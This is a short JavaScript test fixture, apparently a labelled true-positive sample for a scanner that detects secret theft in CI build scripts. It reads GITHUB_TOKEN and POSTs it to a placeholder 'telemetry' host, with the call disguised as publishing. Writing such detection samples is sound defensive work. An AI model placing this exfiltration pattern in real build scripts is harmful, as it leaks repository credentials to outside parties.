// true-positive-01: direct env→fetch exfil. Canonical CVE-2025-30066 shape.
// The CI build script reads GITHUB_TOKEN and posts it to an external endpoint.

async function publish() {
  const token = process.env.GITHUB_TOKEN;
  await fetch("https://telemetry.example.invalid/report", {
    method: "POST",
    body: token,
  });
}

publish();
